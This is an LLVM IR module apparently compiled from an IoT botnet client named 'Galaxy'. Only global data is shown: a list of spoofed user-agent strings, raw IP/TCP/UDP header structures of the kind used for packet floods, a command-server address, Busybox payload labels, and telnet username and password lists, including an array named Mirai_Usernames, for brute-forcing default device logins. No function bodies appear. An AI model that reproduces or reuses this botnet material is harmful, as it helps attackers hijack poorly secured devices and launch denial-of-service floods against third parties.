; ModuleID = 'host/ir_sub/Galaxy.g.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [14 x i8] c"127.0.0.1:760\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [18 x i8] c"Payload w Busybox\00", align 1
@Payload = global i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [25 x i8] c"\C2\B4Payload Witout Busybox\00", align 1
@Telnet_Usernames = global [35 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.66 = private unnamed_addr constant [15 x i8] c"default\00admin\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.68 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@Telnet_Passwords = global [35 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)], align 16
@.str.70 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.72 = private unnamed_addr constant [12 x i8] c"adminadmin\00\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"OxhlwSG8\00true\00\00", align 1
@.str.74 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.76 = private unnamed_addr constant [15 x i8] c"LSiuY7pOmZG2s\00\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"Uq-4GIt3M\00\00", align 1
@.str.78 = private unnamed_addr constant [8 x i8] c"GM8182\00\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"cms500\00\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.81 = private unnamed_addr constant [9 x i8] c"3ep5w2u\00\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"Serv4EMC0\00\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ROOT500\00\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"tlJwpbo6\00\00", align 1
@.str.85 = private unnamed_addr constant [10 x i8] c"ahetzip8\00\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"inflection\00\00", align 1
@.str.87 = private unnamed_addr constant [10 x i8] c"kont2004\00\00", align 1
@.str.88 = private unnamed_addr constant [16 x i8] c"t0talc0ntr0l4!\00\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.90 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@Mirai_Usernames = global [34 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
